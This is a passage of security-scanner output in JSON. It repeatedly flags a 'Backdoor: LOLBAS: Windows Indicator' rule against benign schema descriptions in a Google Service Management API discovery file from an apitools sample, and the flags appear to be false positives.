                      "markdown": "`          \"type\": \"string\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer projects owned by the customer collectively.\",\n          \"$ref\": \"QuotaSettings\"\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2382,
                  "startColumn": 35,
                  "endLine": 2382,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    },\n    \"CustomerSettings\": {\n      \"id\": \"CustomerSettings\",\n      \"description\": \"Settings that control how a customer (identified by a billing account) uses\\na service\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                    "rendered": {
                      "text": "    },\n    \"CustomerSettings\": {\n      \"id\": \"CustomerSettings\",\n      \"description\": \"Settings that control how a customer (identified by a billing account) uses\\na service\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                      "markdown": "`    },\n    \"CustomerSettings\": {\n      \"id\": \"CustomerSettings\",\n      \"description\": \"Settings that control how a customer (identified by a billing account) uses\\na service\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2162,
                  "startColumn": 337,
                  "endLine": 2162,
                  "endColumn": 341,
                  "snippet": {
                    "text": "visibility labels that are used to determine what API surface is\\nvisible to calls made by this project. The visible surface is a union of\\nthe surface features associated with each label listed here, plus the\\npublicly visible (unrestricted) surface.\\n\\nThe service producer may add or remove labels at any time. The service\\nconsumer may add a label if the calling user has been granted permission\\nto do so by the producer.  The service consumer may also remove any label\\nat any time.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n          }\n        }\n      }\n    },",
                    "rendered": {
                      "text": "visibility labels that are used to determine what API surface is\\nvisible to calls made by this project. The visible surface is a union of\\nthe surface features associated with each label listed here, plus the\\npublicly visible (unrestricted) surface.\\n\\nThe service producer may add or remove labels at any time. The service\\nconsumer may add a label if the calling user has been granted permission\\nto do so by the producer.  The service consumer may also remove any label\\nat any time.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n          }\n        }\n      }\n    },",
                      "markdown": "`visibility labels that are used to determine what API surface is\\nvisible to calls made by this project. The visible surface is a union of\\nthe surface features associated with each label listed here, plus the\\npublicly visible (unrestricted) surface.\\n\\nThe service producer may add or remove labels at any time. The service\\nconsumer may add a label if the calling user has been granted permission\\nto do so by the producer.  The service consumer may also remove any label\\nat any time.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n          }\n        }\n      }\n    },`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2158,
                  "startColumn": 35,
                  "endLine": 2158,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    },\n    \"VisibilitySettings\": {\n      \"id\": \"VisibilitySettings\",\n      \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"visibilityLabels\": {\n",
                    "rendered": {
                      "text": "    },\n    \"VisibilitySettings\": {\n      \"id\": \"VisibilitySettings\",\n      \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"visibilityLabels\": {\n",
                      "markdown": "`    },\n    \"VisibilitySettings\": {\n      \"id\": \"VisibilitySettings\",\n      \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"visibilityLabels\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2054,
                  "startColumn": 46,
                  "endLine": 2054,
                  "endColumn": 50,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"usage\": {\n          \"description\": \"The used quota value at the \\\"query_time\\\".\",\n          \"type\": \"string\",\n          \"format\": \"int64\"\n        },\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"usage\": {\n          \"description\": \"The used quota value at the \\\"query_time\\\".\",\n          \"type\": \"string\",\n          \"format\": \"int64\"\n        },\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"usage\": {\n          \"description\": \"The used quota value at the \\\"query_time\\\".\",\n          \"type\": \"string\",\n          \"format\": \"int64\"\n        },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2050,
                  "startColumn": 71,
                  "endLine": 2050,
                  "endColumn": 75,
                  "snippet": {
                    "text": "    },\n    \"QuotaUsage\": {\n      \"id\": \"QuotaUsage\",\n      \"description\": \"Specifies the used quota amount for a quota limit at a particular time.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"usage\": {\n",
                    "rendered": {
                      "text": "    },\n    \"QuotaUsage\": {\n      \"id\": \"QuotaUsage\",\n      \"description\": \"Specifies the used quota amount for a quota limit at a particular time.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"usage\": {\n",
                      "markdown": "`    },\n    \"QuotaUsage\": {\n      \"id\": \"QuotaUsage\",\n      \"description\": \"Specifies the used quota amount for a quota limit at a particular time.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"usage\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1912,
                  "startColumn": 39,
                  "endLine": 1912,
                  "endColumn": 48,
                  "snippet": {
                    "text": "          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n          \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n          \"$ref\": \"VisibilitySettings\"\n        },\n        \"properties\": {\n",
                    "rendered": {
                      "text": "          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n          \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n          \"$ref\": \"VisibilitySettings\"\n        },\n        \"properties\": {\n",
                      "markdown": "`          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n          \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n          \"$ref\": \"VisibilitySettings\"\n        },\n        \"properties\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1908,
                  "startColumn": 39,
                  "endLine": 1908,
                  "endColumn": 48,
                  "snippet": {
                    "text": "          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer project.\",\n          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n",
                    "rendered": {
                      "text": "          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer project.\",\n          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n",
                      "markdown": "`          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer project.\",\n          \"$ref\": \"QuotaSettings\"\n        },\n        \"visibilitySettings\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 39,
                  "endLine": 1904,
                  "endColumn": 48,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"usageSettings\": {\n          \"description\": \"Settings that control whether this service is usable by the consumer\\nproject.\",\n          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"usageSettings\": {\n          \"description\": \"Settings that control whether this service is usable by the consumer\\nproject.\",\n          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"usageSettings\": {\n          \"description\": \"Settings that control whether this service is usable by the consumer\\nproject.\",\n          \"$ref\": \"UsageSettings\"\n        },\n        \"quotaSettings\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1892,
                  "startColumn": 35,
                  "endLine": 1892,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    },\n    \"ProjectSettings\": {\n      \"id\": \"ProjectSettings\",\n      \"description\": \"Settings that control how a consumer project uses a service.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                    "rendered": {
                      "text": "    },\n    \"ProjectSettings\": {\n      \"id\": \"ProjectSettings\",\n      \"description\": \"Settings that control how a consumer project uses a service.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                      "markdown": "`    },\n    \"ProjectSettings\": {\n      \"id\": \"ProjectSettings\",\n      \"description\": \"Settings that control how a consumer project uses a service.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 223,
                  "endLine": 1635,
                  "endColumn": 227,
                  "snippet": {
                    "text": "          }\n        },\n        \"consumerDestinations\": {\n          \"description\": \"Monitoring configurations for sending metrics to the consumer project.\\nThere can be multiple consumer destinations, each one must have a\\ndifferent monitored resource type. A metric can be used in at most\\none consumer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"MonitoringDestination\"\n",
                    "rendered": {
                      "text": "          }\n        },\n        \"consumerDestinations\": {\n          \"description\": \"Monitoring configurations for sending metrics to the consumer project.\\nThere can be multiple consumer destinations, each one must have a\\ndifferent monitored resource type. A metric can be used in at most\\none consumer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"MonitoringDestination\"\n",
                      "markdown": "`          }\n        },\n        \"consumerDestinations\": {\n          \"description\": \"Monitoring configurations for sending metrics to the consumer project.\\nThere can be multiple consumer destinations, each one must have a\\ndifferent monitored resource type. A metric can be used in at most\\none consumer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"MonitoringDestination\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1628,
                  "startColumn": 223,
                  "endLine": 1628,
                  "endColumn": 227,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"producerDestinations\": {\n          \"description\": \"Monitoring configurations for sending metrics to the producer project.\\nThere can be multiple producer destinations, each one must have a\\ndifferent monitored resource type. A metric can be used in at most\\none producer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"MonitoringDestination\"\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"producerDestinations\": {\n          \"description\": \"Monitoring configurations for sending metrics to the producer project.\\nThere can be multiple producer destinations, each one must have a\\ndifferent monitored resource type. A metric can be used in at most\\none producer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"MonitoringDestination\"\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"producerDestinations\": {\n          \"description\": \"Monitoring configurations for sending metrics to the producer project.\\nThere can be multiple producer destinations, each one must have a\\ndifferent monitored resource type. A metric can be used in at most\\none producer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"MonitoringDestination\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1596,
                  "startColumn": 214,
                  "endLine": 1596,
                  "endColumn": 218,
                  "snippet": {
                    "text": "          }\n        },\n        \"consumerDestinations\": {\n          \"description\": \"Logging configurations for sending logs to the consumer project.\\nThere can be multiple consumer destinations, each one must have a\\ndifferent monitored resource type. A log can be used in at most\\none consumer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"LoggingDestination\"\n",
                    "rendered": {
                      "text": "          }\n        },\n        \"consumerDestinations\": {\n          \"description\": \"Logging configurations for sending logs to the consumer project.\\nThere can be multiple consumer destinations, each one must have a\\ndifferent monitored resource type. A log can be used in at most\\none consumer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"LoggingDestination\"\n",
                      "markdown": "`          }\n        },\n        \"consumerDestinations\": {\n          \"description\": \"Logging configurations for sending logs to the consumer project.\\nThere can be multiple consumer destinations, each one must have a\\ndifferent monitored resource type. A log can be used in at most\\none consumer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"LoggingDestination\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1589,
                  "startColumn": 214,
                  "endLine": 1589,
                  "endColumn": 218,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"producerDestinations\": {\n          \"description\": \"Logging configurations for sending logs to the producer project.\\nThere can be multiple producer destinations, each one must have a\\ndifferent monitored resource type. A log can be used in at most\\none producer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"LoggingDestination\"\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"producerDestinations\": {\n          \"description\": \"Logging configurations for sending logs to the producer project.\\nThere can be multiple producer destinations, each one must have a\\ndifferent monitored resource type. A log can be used in at most\\none producer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"LoggingDestination\"\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"producerDestinations\": {\n          \"description\": \"Logging configurations for sending logs to the producer project.\\nThere can be multiple producer destinations, each one must have a\\ndifferent monitored resource type. A log can be used in at most\\none producer destination.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"LoggingDestination\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1574,
                  "startColumn": 50,
                  "endLine": 1574,
                  "endColumn": 54,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"changeMetric\": {\n          \"description\": \"Change of resource usage at a particular timestamp. This should a\\nDELTA metric.\",\n          \"type\": \"string\"\n        },\n        \"generatedMetric\": {\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"changeMetric\": {\n          \"description\": \"Change of resource usage at a particular timestamp. This should a\\nDELTA metric.\",\n          \"type\": \"string\"\n        },\n        \"generatedMetric\": {\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"changeMetric\": {\n          \"description\": \"Change of resource usage at a particular timestamp. This should a\\nDELTA metric.\",\n          \"type\": \"string\"\n        },\n        \"generatedMetric\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1570,
                  "startColumn": 51,
                  "endLine": 1570,
                  "endColumn": 55,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"snapshotMetric\": {\n          \"description\": \"Total usage of a resource at a particular timestamp. This should be\\na GAUGE metric.\",\n          \"type\": \"string\"\n        },\n        \"changeMetric\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"snapshotMetric\": {\n          \"description\": \"Total usage of a resource at a particular timestamp. This should be\\na GAUGE metric.\",\n          \"type\": \"string\"\n        },\n        \"changeMetric\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"snapshotMetric\": {\n          \"description\": \"Total usage of a resource at a particular timestamp. This should be\\na GAUGE metric.\",\n          \"type\": \"string\"\n        },\n        \"changeMetric\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1548,
                  "startColumn": 105,
                  "endLine": 1548,
                  "endColumn": 114,
                  "snippet": {
                    "text": "igs.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"AreaUnderCurveParams\"\n          }\n        }\n      }\n    },\n    \"BillingStatusRule\": {\n      \"id\": \"BillingStatusRule\",\n      \"description\": \"Defines the billing status requirements for operations.\\n\\nWhen used with\\n[Service Control API](https:\\/\\/cloud.google.com\\/service-control\\/), the\\nfollowing statuses are supported:\\n\\n- **current**: the associated billing account is up to date and capable of\\n               paying for resource usages.\\n- **delinquent**: the associated billing account has a correctable problem,\\n        ",
                    "rendered": {
                      "text": "igs.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"AreaUnderCurveParams\"\n          }\n        }\n      }\n    },\n    \"BillingStatusRule\": {\n      \"id\": \"BillingStatusRule\",\n      \"description\": \"Defines the billing status requirements for operations.\\n\\nWhen used with\\n[Service Control API](https:\\/\\/cloud.google.com\\/service-control\\/), the\\nfollowing statuses are supported:\\n\\n- **current**: the associated billing account is up to date and capable of\\n               paying for resource usages.\\n- **delinquent**: the associated billing account has a correctable problem,\\n        ",
                      "markdown": "`igs.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"AreaUnderCurveParams\"\n          }\n        }\n      }\n    },\n    \"BillingStatusRule\": {\n      \"id\": \"BillingStatusRule\",\n      \"description\": \"Defines the billing status requirements for operations.\\n\\nWhen used with\\n[Service Control API](https:\\/\\/cloud.google.com\\/service-control\\/), the\\nfollowing statuses are supported:\\n\\n- **current**: the associated billing account is up to date and capable of\\n               paying for resource usages.\\n- **delinquent**: the associated billing account has a correctable problem,\\n        `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1520,
                  "startColumn": 648,
                  "endLine": 1520,
                  "endColumn": 657,
                  "snippet": {
                    "text": "T64\\n    billing:\\n      metrics:\\n      - library.googleapis.com\\/read_calls\\n      - library.googleapis.com\\/write_calls\\n\\nThe next example shows how to enable billing status check and customize the\\ncheck behavior. It makes sure billing status check is included in the `Check`\\nmethod of [Service Control API](https:\\/\\/cloud.google.com\\/service-control\\/).\\nIn the example, \\\"google.storage.Get\\\" method can be served when the billing\\nstatus is either `current` or `delinquent`, while \\\"google.storage.Write\\\"\\nmethod can only be served when the billing status is `current`:\\n\\n    billing:\\n      rules",
                    "rendered": {
                      "text": "T64\\n    billing:\\n      metrics:\\n      - library.googleapis.com\\/read_calls\\n      - library.googleapis.com\\/write_calls\\n\\nThe next example shows how to enable billing status check and customize the\\ncheck behavior. It makes sure billing status check is included in the `Check`\\nmethod of [Service Control API](https:\\/\\/cloud.google.com\\/service-control\\/).\\nIn the example, \\\"google.storage.Get\\\" method can be served when the billing\\nstatus is either `current` or `delinquent`, while \\\"google.storage.Write\\\"\\nmethod can only be served when the billing status is `current`:\\n\\n    billing:\\n      rules",
                      "markdown": "`T64\\n    billing:\\n      metrics:\\n      - library.googleapis.com\\/read_calls\\n      - library.googleapis.com\\/write_calls\\n\\nThe next example shows how to enable billing status check and customize the\\ncheck behavior. It makes sure billing status check is included in the `Check`\\nmethod of [Service Control API](https:\\/\\/cloud.google.com\\/service-control\\/).\\nIn the example, \\\"google.storage.Get\\\" method can be served when the billing\\nstatus is either `current` or `delinquent`, while \\\"google.storage.Write\\\"\\nmethod can only be served when the billing status is `current`:\\n\\n    billing:\\n      rules`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1356,
                  "startColumn": 78,
                  "endLine": 1356,
                  "endColumn": 87,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n          \"description\": \"The service control environment to use. If empty, no control plane\\nfeature (like quota and billing) will be enabled.\",\n          \"type\": \"string\"\n        }\n      }\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n          \"description\": \"The service control environment to use. If empty, no control plane\\nfeature (like quota and billing) will be enabled.\",\n          \"type\": \"string\"\n        }\n      }\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n          \"description\": \"The service control environment to use. If empty, no control plane\\nfeature (like quota and billing) will be enabled.\",\n          \"type\": \"string\"\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1356,
                  "startColumn": 37,
                  "endLine": 1356,
                  "endColumn": 46,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n          \"description\": \"The service control environment to use. If empty, no control plane\\nfeature (like quota and billing) will be enabled.\",\n          \"type\": \"string\"\n        }\n      }\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n          \"description\": \"The service control environment to use. If empty, no control plane\\nfeature (like quota and billing) will be enabled.\",\n          \"type\": \"string\"\n        }\n      }\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n          \"description\": \"The service control environment to use. If empty, no control plane\\nfeature (like quota and billing) will be enabled.\",\n          \"type\": \"string\"\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1204,
                  "startColumn": 87,
                  "endLine": 1204,
                  "endColumn": 96,
                  "snippet": {
                    "text": "hitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of the project\\/org that owns the\\nservice.\",\n            \"The service can be seen\\/used by the group of users controlled by the\\nadministrator of the pr",
